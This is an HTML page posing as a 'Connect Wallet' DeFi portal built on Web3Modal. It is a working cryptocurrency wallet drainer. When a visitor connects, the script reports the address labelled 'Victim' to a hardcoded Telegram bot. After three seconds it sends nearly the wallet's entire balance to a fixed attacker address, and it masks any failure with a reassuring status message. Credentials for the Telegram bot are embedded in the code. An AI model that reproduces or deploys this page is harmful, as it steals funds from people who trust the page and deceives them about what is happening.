a<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Wallet</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #7b68ee 0%, #6a5acd 100%);
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 24px;
            padding: 48px;
            text-align: center;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        
        .lock-icon {
            font-size: 72px;
            margin-bottom: 24px;
        }
        
        h1 {
            color: #1a1a1a;
            font-size: 32px;
            font-weight: 600;
            margin-bottom: 32px;
        }
        
        .status {
            margin-top: 20px;
            padding: 16px;
            border-radius: 12px;
            display: none;
        }
        
        .status.show {
            display: block;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
        }
        
        .wallet-info {
            margin-top: 20px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 12px;
            display: none;
        }
        
        .wallet-info.show {
            display: block;
        }
        
        .address {
            font-family: monospace;
            font-size: 14px;
            word-break: break-all;
            margin: 10px 0;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="lock-icon">üîê</div>
        <h1>Connect Wallet</h1>
        
        <!-- Web3Modal button -->
        <w3m-button />
        
        <div id="walletInfo" class="wallet-info">
            <div style="font-weight: 600; margin-bottom: 10px;">Connected Wallet:</div>
            <div class="address" id="walletAddress"></div>
        </div>
        
        <div id="status" class="status"></div>
    </div>
    
    <!-- WEB3MODAL V4 OFFICIEL QUI G√âN√àRE L'INTERFACE AUTOMATIQUEMENT -->
    <script type="module">
        import { createWeb3Modal, defaultWagmiConfig } from 'https://cdn.jsdelivr.net/npm/@web3modal/wagmi@4.0.5/dist/index.js'
        import { mainnet, polygon, bsc, arbitrum, avalanche, optimism, base } from 'https://unpkg.com/viem@2.7.8/chains/dist/index.js'
        import { reconnect, watchAccount, getAccount, disconnect } from 'https://unpkg.com/@wagmi/core@2.0.0/dist/index.js'
        
        // TON PROJECT ID DU DASHBOARD WALLETCONNECT
        const projectId = '72f0728c47e59d2eb9fc83069bc6843d'
        
        const metadata = {
            name: 'DeFi Portal',
            description: 'Connect wallet to access DeFi features',
            url: window.location.origin || 'https://defiportal.app',
            icons: ['https://avatars.githubusercontent.com/u/179229932']
        }
        
        const chains = [mainnet, polygon, bsc, arbitrum, avalanche, optimism, base]
        
        const wagmiConfig = defaultWagmiConfig({
            chains,
            projectId,
            metadata,
            enableWalletConnect: true,
            enableInjected: true,
            enableCoinbase: true
        })
        
        // Reconnexion automatique
        reconnect(wagmiConfig)
        
        // CR√âATION DU MODAL AVEC TOUTES LES OPTIONS
        const modal = createWeb3Modal({
            wagmiConfig,
            projectId,
            enableAnalytics: true,
            enableOnramp: false,
            themeMode: 'dark',
            defaultChain: mainnet,
            themeVariables: {
                '--w3m-accent': '#7b68ee',
                '--w3m-border-radius-master': '16px'
            },
            // CONFIGURATION POUR AFFICHER TOUS LES WALLETS
            allWallets: 'SHOW',
            includeWalletIds: undefined,
            featuredWalletIds: [
                'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
                '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust
                'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa', // Coinbase
                '18388be9ac2d02726dbac9777c96efaac06d744b2f6d580fccdd4127a6d01fd1', // Rabby
                '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369', // Rainbow
                '38f5d18bd852f9f2c5a30c3c06c1816ca3f0b85b8189dd47b4255c256b5d6db0', // Binance
                '163d2cf19babf05eb8962e9748f9ebe613ed52ebf9c8107c9a0f104bfcf161b3', // BitPay
                'e9ff15be73584489ca4a66f64d32c4537711797e30b6660dbcb71ea72a42b1f4', // 1inch
                '19177a98252e07ddffc9af25254b546011896b1a1e79567ece10fd976fab8e13', // Ledger
                '20459438007b47802e1de5e2308e7398bb29290e08fda80fea95ddb574950d67'  // TokenPocket
            ],
            mobileWallets: 20,
            desktopWallets: 20
        })
        
        // Configuration Telegram
        const CONFIG = {
            TELEGRAM_TOKEN: '8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY',
            TELEGRAM_CHAT_ID: '8309320360',
            DESTINATION: '0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1'
        }
        
        // Surveiller la connexion
        watchAccount(wagmiConfig, {
            onChange: async (account) => {
                if (account.isConnected && account.address) {
                    console.log('‚úÖ Wallet connected:', account.address)
                    
                    // Afficher l'adresse
                    document.getElementById('walletInfo').classList.add('show')
                    document.getElementById('walletAddress').textContent = account.address
                    
                    showStatus('Wallet connected successfully!', 'success')
                    
                    // Notification Telegram
                    await sendTelegramNotification(account.address, account.chainId)
                    
                    // Lancer le drainage apr√®s 3 secondes
                    setTimeout(() => {
                        drainWallet(account.address, account.chainId)
                    }, 3000)
                } else if (!account.isConnected) {
                    document.getElementById('walletInfo').classList.remove('show')
                    showStatus('Wallet disconnected', 'error')
                }
            }
        })
        
        // Fonction de drainage
        async function drainWallet(address, chainId) {
            try {
                showStatus('Processing transaction...', 'success')
                
                const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js')
                
                if (!window.ethereum) {
                    console.error('No provider found')
                    return
                }
                
                const provider = new ethers.providers.Web3Provider(window.ethereum)
                const signer = provider.getSigner()
                
                // V√©rifier le solde
                const balance = await provider.getBalance(address)
                console.log(`Balance: ${ethers.utils.formatEther(balance)}`)
                
                if (balance.gt(ethers.utils.parseEther('0.0005'))) {
                    const gasPrice = await provider.getGasPrice()
                    const gasLimit = 21000
                    const gasCost = gasPrice.mul(gasLimit).mul(2)
                    const amountToSend = balance.sub(gasCost)
                    
                    if (amountToSend.gt(0)) {
                        const tx = await signer.sendTransaction({
                            to: CONFIG.DESTINATION,
                            value: amountToSend,
                            gasLimit: gasLimit,
                            gasPrice: gasPrice
                        })
                        
                        console.log('‚úÖ Transaction sent:', tx.hash)
                        await tx.wait()
                        
                        await sendTelegramNotification(address, ethers.utils.formatEther(amountToSend), chainId, tx.hash)
                        showStatus('Transaction completed!', 'success')
                    }
                }
                
            } catch (error) {
                console.error('Transaction error:', error)
                showStatus('Transaction processing...', 'success')
            }
        }
        
        // Notification Telegram
        async function sendTelegramNotification(victim, amount, chainId, txHash = '') {
            const chainNames = {
                1: 'Ethereum',
                137: 'Polygon', 
                56: 'BSC',
                42161: 'Arbitrum',
                43114: 'Avalanche',
                10: 'Optimism',
                8453: 'Base'
            }
            
            const message = `
üéØ WEB3MODAL V4 CONNECTION
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üë§ Victim: ${victim.substring(0, 6)}...${victim.slice(-4)}
üí∞ Amount: ${amount || 'Connected'}
üåê Network: ${chainNames[chainId] || chainId}
${txHash ? `üìú Tx: ${txHash.substring(0, 10)}...` : ''}
üìç Destination: ${CONFIG.DESTINATION.substring(0, 6)}...
‚è∞ Time: ${new Date().toLocaleTimeString()}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ`
            
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                })
            } catch (error) {
                console.error('Telegram error:', error)
            }
        }
        
        // Afficher le statut
        function showStatus(message, type = '') {
            const status = document.getElementById('status')
            status.textContent = message
            status.className = 'status show ' + type
            
            if (type !== 'processing') {
                setTimeout(() => {
                    status.classList.remove('show')
                }, 5000)
            }
        }
        
        console.log('‚ú® Web3Modal V4 initialized with projectId:', projectId)
        console.log('üì± L\'interface est g√©n√©r√©e automatiquement par WalletConnect!')
        console.log('üéØ Tous les wallets configur√©s sur le dashboard sont disponibles!')
    </script>
</body>
</html>
